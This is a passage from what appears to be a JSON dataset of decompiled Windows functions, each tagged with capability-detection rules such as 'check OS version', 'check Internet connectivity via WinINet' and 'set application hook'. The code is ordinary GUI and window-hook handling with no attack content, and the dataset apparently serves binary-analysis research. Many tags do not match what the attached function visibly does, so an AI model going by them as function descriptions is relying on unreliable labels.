        "decompiled_code": "\nvoid __fastcall fcn.00473dcc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x50))();\n    if ((((cVar1 != '\\0') && (*(in_EAX + 0x1da) != '\\0')) && ((*(in_EAX + 0xa2) != '\\0' || (*(in_EAX + 0x97) != '\\0'))))\n       && (((cVar1 = fcn.00473d78(&stack0xfffffffc),  cVar1 != '\\0' && (iVar2 = fcn.00474d60(),  iVar2 != 0)) &&\n           ((*(in_EAX + 0x97) == '\\0' || (*(iVar2 + 0x1ae) == '\\x05')))))) {\n        if (((*(iVar2 + 0x1ae) == '\\x02') && (iVar3 = fcn.0046cb64(),  0x40046 < iVar3)) ||\n           ((*(iVar2 + 0x1a8) == 0 && (*(iVar2 + 0x1a4) == 0)))) {\n            fcn.00404154();\n        }\n        else {\n            fcn.00404154();\n        }\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    fcn.0044c61c();\n    return;\n}\n",
        "token_count": 349
    },
    "00473f64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00473f64(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uchar *puVar6;\n    int32_t iStack128;\n    uchar *puStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint var_5ch;\n    uint var_20h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_10h = *(param_2 + 8);\n    iVar5 = *(var_10h + 8);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar5 < -0x2c0) {\n        if (iVar5 == -0x2c1) {\n            *(in_EAX + 0xaf) = 1;\n            fcn.0047671c();\n            fcn.00474918();\n            *(var_4h + 0xaf) = 0;\n            return;\n        }\n    // switch table (10 cases) at 0x473f9d\n        switch(iVar5) {\n        case -0x2cb:\n            goto code_r0x004747b0;\n        default:\n            return;\n        case -0x2c6:\n            uStack112 = 0x474003;\n            iVar5 = fcn.00446870(var_10h + 0x10);\n            if (iVar5 == 0) {\n                return;\n            }\n            if (*(var_10h + 0x1c) == 0) {\n                return;\n            }\n            uStack112 = 0x474021;\n            fcn.00404154();\n            return;\n        case -0x2c4:\n            if (*(in_EAX + 0x276) == '\\0') {\n                fcn.00474918();\n            }\n            if (*(var_4h + 0x30a) == 0) {\n                return;\n            }\n            (*var_4h[0xc2])();\n            return;\n        case -0x2c3:\n            uVar4 = (**(*in_EAX + 0xf0))();\n            *(var_8h + 0xc) = uVar4 & 0x7f;\n            if (*(var_4h + 0x276) != '\\0') {\n                return;\n            }\n            var_4h[0xa3] = *(var_10h + 0xc);\n            return;\n        case -0x2c2:\n            if ((*(in_EAX + 0x276) == '\\0') && (*(var_10h + 0xc) == in_EAX[0xa3])) {\n                *(param_2 + 0xc) = 0;\n            }\n            else {\n                uVar4 = (**(*in_EAX + 0xec))();\n                *(var_8h + 0xc) = uVar4 & 0x7f;\n                if ((*(var_10h + 0x1c) == 0) && (*(var_10h + 0x19) == *0x491eba)) {\n                    fcn.0047038c();\n                    fcn.00470ee8();\n                    fcn.00414f68();\n                    var_4h[0xb2] = var_4h[0xb2] + 1;\n                }\n            }\n            var_4h[0xa3] = -1;\n            return;\n        }\n    }\n    if (iVar5 == -0x2c0) {\n        if (*(in_EAX + 0xaf) == '\\0') {\n            fcn.00474918();\n            *(var_4h + 0x276) = 0;\n        }\n        else if (*(in_EAX + 0x32a) != 0) {\n            (*in_EAX[0xca])();\n        }\n        *(var_4h + 0xaf) = 0;\n        return;\n    }\n    if (iVar5 == -0x2bf) {\n        *(in_EAX + 0x276) = 1;\n        in_EAX[0xb2] = 0;\n        if (*(in_EAX + 0x322) != 0) {\n            (*in_EAX[200])();\n        }\n        if (*(var_4h + 0xaf) != '\\0') {\n            return;\n        }\n        fcn.0047671c();\n        return;\n    }\n    if (iVar5 == -700) {\n        if (*(in_EAX + 0x276) == '\\0') {\n            return;\n        }\n        uVar4 = fcn.004764b0();\n        *(var_8h + 0xc) = uVar4 & 0x7f;\n        return;\n    }\n    if (iVar5 != -0xc) {\n        return;\n    }\n    uStack112 = 0x4746a7;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack120 = 0x474048;\n    fcn.00421928();\n    *(var_8h + 0xc) = 0;\n    if ((*(var_10h + 0xe) & 1) != 0) {\n        iVar5 = 0;\n        puStack124 = *(var_10h + 0x24);\n        puStack120 = NULL;\n        puVar6 = *(var_4h[0x9a] + 8);\n        if (puVar6 < 0) {\n            if (0 < puVar6 >> 0x1f) goto code_r0x004742d8;\n        }\n        else if (puStack124 < puVar6) {\ncode_r0x004742d8:\n            puStack120 = 0x4742e2;\n            iVar5 = fcn.0047257c();\n        }\n        if (iVar5 == 0) {\n            puStack120 = 0x4742ed;\n            fcn.00404878();\n            return;\n        }\n        iVar1 = *(var_10h + 0xc);\n        if (iVar1 == 0x10001) {\n            puStack124 = 0x47455d;\n            iStack128 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            puStack120 = &stack0xfffffffc;\n            fcn.00421d14();\n            fcn.00421b80();\n            fcn.00421b9c();\n            iVar5 = var_4h[0x9c];\n            iVar1 = *(iVar5 + 0xc);\n            *(iVar1 + 0xc) = var_4h;\n            *(iVar1 + 8) = 0x474f90;\n            iVar5 = *(iVar5 + 0x14);\n            *(iVar5 + 0xc) = var_4h;\n            *(iVar5 + 8) = 0x474f90;\n            *(var_4h + 0x9d) = 0;\n            var_9h = *0x474914;\n            puVar6 = &stack0xfffffff3;\n            cVar2 = (**(*var_4h + 0xe8))(puVar6, 0);\n            if ((cVar2 != '\\0') && (*(var_4h + 0x279) == '\\x01')) {\n                var_9h = *0x474914;\n                cVar2 = (**(*var_4h + 0xe0))(&stack0xfffffff3);\n            }\n            if ((var_9h & 1) != 0) {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 0x10000;\n            }\n            if ((var_9h & 2) != 0) {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 0x20000;\n            }\n            if ((var_9h & 4) != 0) {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 0x40000;\n            }\n            if ((var_9h & 8) != 0) {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 0x80000;\n            }\n            if ((var_9h & 0x10) != 0) {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 0x100000;\n            }\n            uVar3 = fcn.0042074c();\n            *(var_10h + 0x3c) = uVar3;\n            fcn.004214cc();\n            uVar3 = fcn.0042074c();\n            *(var_10h + 0x48) = uVar3;\n            if (cVar2 == '\\0') {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 4;\n                fcn.00404878();\n                fcn.00404878();\n                return;\n            }\n            if (*(var_4h + 0x9d) != '\\0') {\n                *(var_4h + 0x9d) = 0;\n                iVar5 = var_4h[0x9c];\n                iVar1 = *(iVar5 + 0xc);\n                *(iVar1 + 8) = 0;\n                *(iVar1 + 0xc) = 0;\n                iVar5 = *(iVar5 + 0x14);\n                *(iVar5 + 8) = 0;\n                *(iVar5 + 0xc) = 0;\n                uVar3 = fcn.00420c58(0x3c, &fcn.00473f64::var_5ch);\n                iVar5 = sub.gdi32.dll_GetObjectA(uVar3);\n                if (iVar5 != 0) {\n                    fcn.00421d14();\n                    iVar5 = sub.gdi32.dll_CreateFontIndirectA(&fcn.00473f64::var_5ch);\n                    var_4h[0xd4] = iVar5;\n                    iVar5 = sub.gdi32.dll_SelectObject(*(var_10h + 0x10), iVar5);\n                    var_4h[0xd5] = iVar5;\n                    *(var_8h + 0xc) = *(var_8h + 0xc) | 2;\n                }\n            }\n            cVar2 = (**(*var_4h + 0xf4))();\n            if (cVar2 != '\\0') {\n                *(var_8h + 0xc) = *(var_8h + 0xc) | 0x10;\n            }\n            *in_FS_OFFSET = puVar6;\n            iStack128 = 0x47468b;\n            fcn.00421d14();\n            return;\n        }\n        if (iVar1 == 0x10002) {\n            puStack124 = 0x4745ed;\n            iStack128 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            puStack120 = &stack0xfffffffc;\n            fcn.00421d14();\n            fcn.00421b80();\n            fcn.00421b9c();\n            if (iVar5 != 0) {\n                (**(*var_4h + 0xe8))(&stack0xfffffff3, 1);\n            }\n            *in_FS_OFFSET = iStack128;\n            puStack120 = 0x4745f4;\n            puStack124 = 0x4745ec;\n            fcn.00421d14();\n            return;\n        }\n        if (iVar1 == 0x10003) {\n            if (iVar5 != 0) {\n                puStack120 = 0x2;\n                puStack124 = &stack0xfffffff3;\n                iStack128 = 0x47466b;\n                (**(*var_4h + 0xe8))();\n            }\n        }\n        else if ((iVar1 == 0x10004) && (iVar5 != 0)) {\n            puStack120 = 0x3;\n            puStack124 = &stack0xfffffff3;\n            iStack128 = 0x47468b;\n            (**(*var_4h + 0xe8))();\n        }\n        goto code_r0x0047468b;\n    }\n    puStack120 = 0x474068;\n    (**(*var_4h + 0x44))();\n    iVar5 = *(var_10h + 0xc);\n    if (iVar5 != 1) {\n        if (iVar5 == 2) {\n            puStack120 = 0x474235;\n            cVar2 = (**(*var_4h + 0xf4))();\n            if (cVar2 != '\\0') {\n                puStack120 = 0x47424d;\n                (**(*var_4h + 0xe4))();\n            }\n        }\n        else if (iVar5 == 3) {\n            puStack120 = 0x474261;\n            cVar2 = (**(*var_4h + 0xf4))();\n            if (cVar2 != '\\0') {\n                puStack120 = 0x474279;\n                (**(*var_4h + 0xe4))();\n            }\n        }\n        else if (iVar5 == 4) {\n            puStack120 = 0x47428d;\n            cVar2 = (**(*var_4h + 0xf4))();\n            if (cVar2 != '\\0') {\n                puStack120 = 0x4742a5;\n                (**(*var_4h + 0xe4))();\n            }\n        }\n        goto code_r0x0047468b;\n    }\n    puStack120 = 0x47409a;\n    cVar2 = (**(*var_4h + 0xf4))();\n    if ((cVar2 != '\\0') || (*(var_4h + 0x279) == '\\x01')) {\n        puStack124 = 0x474196;\n        iStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        puStack120 = &stack0xfffffffc;\n        fcn.00421d14();\n        fcn.00421b80();\n        fcn.00421b9c();\n        if (cVar2 == '\\0') {\n            cVar2 = (**(*var_4h + 0xdc))();\n        }\n        else {\n            cVar2 = (**(*var_4h + 0xe4))();\n        }\n        if (cVar2 == '\\0') {\n            *(var_8h + 0xc) = 4;\n            fcn.00404878();\n            fcn.00404878();\n            return;\n        }\n        uVar3 = fcn.0042074c();\n        *(var_10h + 0x3c) = uVar3;\n        fcn.004214cc();\n        uVar3 = fcn.0042074c();\n        *(var_10h + 0x48) = uVar3;\n        *in_FS_OFFSET = iStack128;\n        puStack120 = 0x47419d;\n        puStack124 = 0x474195;\n        fcn.00421d14();\n        return;\n    }\n    puStack120 = 0x4741ac;\n    cVar2 = (**(*var_4h + 0xf4))();\n    if (cVar2 == '\\0') {\n        puStack120 = 0x4741bf;\n        cVar2 = (**(*var_4h + 0xf4))();\n        if (cVar2 != '\\0') goto code_r0x004741e2;\n        puStack120 = 0x4741d2;\n        cVar2 = (**(*var_4h + 0xf4))();\n        if ((cVar2 != '\\0') || (*(var_4h + 0x279) == '\\x01')) goto code_r0x004741e2;\n    }\n    else {\ncode_r0x004741e2:\n        *(var_8h + 0xc) = *(var_8h + 0xc) | 0x20;\n    }\n    puStack120 = 0x4741f8;\n    cVar2 = (**(*var_4h + 0xf4))();\n    if (cVar2 != '\\0') {\n        *(var_8h + 0xc) = *(var_8h + 0xc) | 0x10;\n    }\n    puStack120 = 0x474212;\n    cVar2 = (**(*var_4h + 0xf4))();\n    if (cVar2 != '\\0') {\n        *(var_8h + 0xc) = *(var_8h + 0xc) | 0x40;\n    }\ncode_r0x0047468b:\n    *in_FS_OFFSET = iStack116;\n    uStack112 = 0x4746a6;\n    fcn.00421b58();\n    return;\ncode_r0x004747b0:\n    if (*(in_EAX + 0x276) == '\\0') {\n        return;\n    }\n    if (*(in_EAX + 0xaf) != '\\0') {\n        return;\n    }\n    if (*(in_EAX + 0x312) == 0) {\n        return;\n    }\n    fcn.00414eec();\n    (*var_4h[0xc4])();\n    return;\n}\n",
        "token_count": 3960
    },
    "00474918": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00474918(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    \n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0x418;\n    uStack52 = 0x474931;\n    uStack52 = fcn.0044d1c8();\n    puStack56 = 0x474937;\n    iVar1 = sub.user32.dll_SendMessageA();\n    puStack56 = 0x474944;\n    (**(**(in_EAX + 0x268) + 8))();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            puStack56 = &stack0xffffffcc;\n            uStack64 = 0x417;\n            uStack68 = 0x474962;\n            iStack60 = iVar3;\n            uStack52 = fcn.0044d1c8();\n            uStack72 = 0x474968;\n            sub.user32.dll_SendMessageA();\n            if (puStack56 == NULL) {\n                uStack72 = 0x47497e;\n                iVar2 = fcn.0047038c();\n                uStack72 = 0x474989;\n                fcn.00470ee8();\n                *(iVar2 + 0x1b4) = in_EAX;\n                uStack72 = 0;\n                uStack80 = 0x416;\n                uStack84 = 0x4749a2;\n                iStack76 = iVar3;\n                puStack56 = iVar2;\n                uStack84 = fcn.0044d1c8();\n                sub.user32.dll_SendMessageA();\n                uStack52 = fcn.0044d1c8(0x415, iVar3, &stack0xffffffac);\n                sub.user32.dll_SendMessageA();\n            }\n            puStack56 = 0x4749cd;\n            fcn.00414d8c();\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    puStack56 = 0x4749d8;\n    fcn.00472c98();\n    return;\n}\n",
        "token_count": 580
    },
    "004749e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004749e0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.0044d1c8();\n    iVar3 = sub.user32.dll_GetCapture();\n    if (iVar2 == iVar3) {\n        uVar4 = fcn.00442320();\n        *(arg_8h + -8) = uVar4;\n        if ((*(arg_8h + -8) != 0) && (*(*(arg_8h + -8) + 0x30) != *(arg_8h + -4))) {\n            *(arg_8h + -8) = 0;\n        }\n    }\n    else {\n        *(arg_8h + -8) = 0;\n    }\n    uVar4 = fcn.0044a300(0, 0);\n    *(arg_8h + -0xc) = uVar4;\n    if (((*(arg_8h + -0xc) != 0) && (cVar1 = fcn.004040e4(),  cVar1 != '\\0')) &&\n       (cVar1 = fcn.00445de4(),  cVar1 == '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 319
    },
    "00474b10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474b10(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_10h = param_2;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        iVar2 = *param_2;\n        var_4h = in_EAX;\n        if (iVar2 == 0x200) {\n            uStack60 = 0x474b55;\n            cVar1 = fcn.004749e0(&stack0xfffffffc);\n            if (cVar1 == '\\0') {\n                (**(*var_4h + -0x10))();\n            }\n            else if (*(var_ch + 0x5d) != '\\x01') {\n                (**(*var_4h + -0x10))();\n            }\n        }\n        else {\n            if (iVar2 != 0x201) {\n                if (iVar2 == 0x202) {\n                    uStack60 = 0x474b90;\n                    cVar1 = fcn.004749e0(&stack0xfffffffc);\n                    if (cVar1 != '\\0') {\n                        (**(*var_4h + -0x10))();\n                        if ((var_8h == var_ch) || (cVar1 = fcn.004040e4(),  cVar1 != '\\0')) {\n                            if ((*(var_ch + 0x19a) != '\\0') &&\n                               (((*(var_ch + 0x19b) != '\\0' && (*(var_ch + 0x198) != '\\0')) &&\n                                (*(var_ch + 0x1ae) == '\\x01')))) {\n                                fcn.00470cd0();\n                            }\n                            fcn.004724d4();\n                        }\n                        else {\n                            cVar1 = fcn.004040e4();\n                            if (cVar1 != '\\0') {\n                                return;\n                            }\n                            if (*(var_ch + 0x1ae) == '\\x02') {\n                                return;\n                            }\n                        }\n                    }\n                    goto code_r0x00474d4b;\n                }\n                if (iVar2 != 0x203) goto code_r0x00474d4b;\n            }\n            uStack60 = 0x474c2d;\n            cVar1 = fcn.004749e0(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                if ((*(var_4h + 0x331) != '\\0') && (cVar1 = fcn.004457d4(),  cVar1 != '\\0')) {\n                    fcn.004457e4();\n                }\n                if ((*(var_ch + 0x1ae) != '\\x02') ||\n                   ((iVar2 = fcn.0046cb64(),  0x40046 < iVar2 &&\n                    (*(var_10h + 2) < *(var_ch + 0x40) + *(var_ch + 0x48) + -0xe)))) {\n                    fcn.0044a5c4();\n                }\n                cVar1 = fcn.00445de4();\n                if (cVar1 == '\\0') {\n                    (**(*var_4h + -0x10))();\n                }\n                if (*(var_ch + 0x1ae) == '\\x02') {\n                    return;\n                }\n                if ((*(var_ch + 0x1a8) == 0) && (*(var_ch + 0x1a4) == 0)) {\n                    return;\n                }\n                uStack60 = 0x474d44;\n                uStack64 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.00474aa0(&stack0xfffffffc);\n                *in_FS_OFFSET = uStack64;\n                var_28h = 0;\n                uStack60 = 1;\n                uStack64 = 0x201;\n                uVar3 = fcn.0044d1c8(0x201);\n                iVar2 = sub.user32.dll_PeekMessageA(&fcn.00474b10::var_2ch, uVar3);\n                if ((iVar2 == 0) || (var_28h != 0x12)) {\n                    *var_10h = 0x202;\n                    (**(*var_4h + -0x14))();\n                }\n                else {\n                    sub.user32.dll_PostQuitMessage(var_24h);\n                }\n                return;\n            }\n        }\n    }\ncode_r0x00474d4b:\n    fcn.0044a5c4();\n    return;\n}\n",
        "token_count": 1116
    },
    "00474d60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00474d60(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x474e0f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar3 = *(*(in_EAX + 0x268) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.004040e4();\n            if (((cVar1 != '\\0') && (piVar2 = fcn.00414eec(),  *(piVar2 + 0x57) != '\\0')) &&\n               (cVar1 = (**(*piVar2 + 0x50))(),  cVar1 != '\\0')) {\n                fcn.004455ac();\n                cVar1 = fcn.00458370();\n                if (cVar1 != '\\0') break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x474e16;\n    uStack36 = 0x474e0e;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 353
    },
    "00474f18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00474f18(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    ushort in_CX;\n    uchar var_7h;\n    uint var_6h;\n    \n    var_7h = 1;\n    var_6h._0_2_ = in_CX;\n    if ((arg_ch == '\\0') && (*(in_EAX + 0x2ea) != 0)) {\n        (**(in_EAX + 0x2e8))(&var_7h, in_CX);\n    }\n    if (*(in_EAX + 0x2da) != 0) {\n        (**(in_EAX + 0x2d8))(&var_7h, arg_8h, arg_ch, var_6h);\n    }\n    return var_7h;\n}\n",
        "token_count": 198
    },
    "00475894": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.00475894(void)\n\n{\n    int32_t iVar1;\n    char in_AL;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x496608;\n    if (*0x496600 != 0) {\n        iVar3 = fcn.00472594();\n        iVar5 = iVar1;\n        if (in_AL == '\\0') {\n            do {\n                if (iVar5 == 0) {\n                    iVar5 = iVar3;\n                }\n                iVar5 = iVar5 + -1;\n                piVar4 = fcn.0047257c();\n                if (((*(piVar4 + 0x57) != '\\0') && (cVar2 = (**(*piVar4 + 0x50))(),  cVar2 != '\\0')) &&\n                   (*(piVar4 + 0x19b) != '\\0')) {\n                    return piVar4;\n                }\n            } while (iVar5 != iVar1);\n        }\n        else {\n            do {\n                if (iVar5 == iVar3 + -1) {\n                    iVar5 = 0;\n                }\n                else {\n                    iVar5 = iVar5 + 1;\n                }\n                piVar4 = fcn.0047257c();\n                if (((*(piVar4 + 0x57) != '\\0') && (cVar2 = (**(*piVar4 + 0x50))(),  cVar2 != '\\0')) &&\n                   (*(piVar4 + 0x19b) != '\\0')) {\n                    return piVar4;\n                }\n            } while (iVar5 != iVar1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 390
    },
    "00475c18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00475c18(void)\n\n{\n    uint uVar1;\n    \n    *0x496618 = 0;\n    sub.user32.dll_GetCursorPos(0x496610);\n    if (*0x4965fc == 0) {\n        uVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        *0x4965fc = sub.user32.dll_SetWindowsHookExA(0xffffffff, fcn.00475940, 0, uVar1);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00475c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00475c50(void)\n\n{\n    if (*0x4965fc != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x4965fc);\n    }\n    *0x491ef0 = 0;\n    *0x4965fc = 0;\n    *0x496600 = 0;\n    *0x496608 = 0xffffffff;\n    *0x49660c = 0;\n    return;\n}\n",
        "token_count": 102
    },
    "00475c8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475c8c(int32_t arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        if (arg_10h[1] == 0xb001) {\n            fcn.00404154();\n        }\n        else if (arg_10h[1] == 0x111) {\n            fcn.00475d3c();\n        }\n        else if ((*0x4965fc == 0) &&\n                ((((iVar1 = arg_10h[1],  iVar1 == 0x102 || (iVar1 == 0x100)) || (iVar1 == 0x101)) ||\n                 ((iVar1 == 0x104 || (iVar1 == 0x105)))))) {\n            uVar2 = fcn.0044d1c8();\n            *arg_10h = uVar2;\n        }\n    }\n    sub.user32.dll_CallNextHookEx(*0x49661c, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 254
    },
    "00475d3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00475d3c(void)\n\n{\n    if (*0x49661c != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x49661c);\n    }\n    *0x496604 = 0;\n    *0x49661c = 0;\n    return;\n}\n",
        "token_count": 70
    },
    "00475d60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00475d60(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((((*(in_EAX + 0x338) != 0) && (*(in_EAX + 0x33c) != 0)) && (*(*(in_EAX + 0x33c) + 0x1a4) != 0)) &&\n       (*(in_EAX + 0x334) != 0)) {\n        iVar1 = fcn.0043c3c4();\n        iVar1 = iVar1 + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.0043c3d4();\n                fcn.0043c608();\n                fcn.0043c550();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        fcn.00403f58();\n        *(in_EAX + 0x334) = 0;\n        *(in_EAX + 0x33c) = 0;\n        *(in_EAX + 0x338) = 0;\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00475e0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00475e0c(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY68;\n    uint uStackY64;\n    uchar *puStackY60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_12h;\n    uint var_eh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        return 0;\n    }\n    *(in_EAX + 0x330) = 0;\n    uStack48 = 0x476111;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if (param_2[0x6a] == 0) {\n        if (param_2[0x69] == NULL) {\n            fcn.00404878();\n            return 0;\n        }\n        puStack44 = &stack0xfffffffc;\n        (**(*param_2[0x69] + 0x44))();\n        fcn.00475d60();\n        uVar3 = fcn.0043ed60();\n        *(in_EAX + 0x334) = uVar3;\n        iVar2 = fcn.0043c984();\n        if (iVar2 != 0) {\n            fcn.0043e5dc();\n        }\n        fcn.0043ee24();\n        *(*(in_EAX + 0x334) + 0x68) = 1;\n        iVar2 = fcn.0043c984();\n        if (iVar2 != 0) {\n            fcn.0043e19c();\n        }\n        *(in_EAX + 0x338) = param_2[0x69];\n        iVar2 = fcn.0043c3c4();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                fcn.0043c3d4();\n                fcn.0043c608();\n                fcn.0043c550();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    else {\n        *(in_EAX + 0x334) = 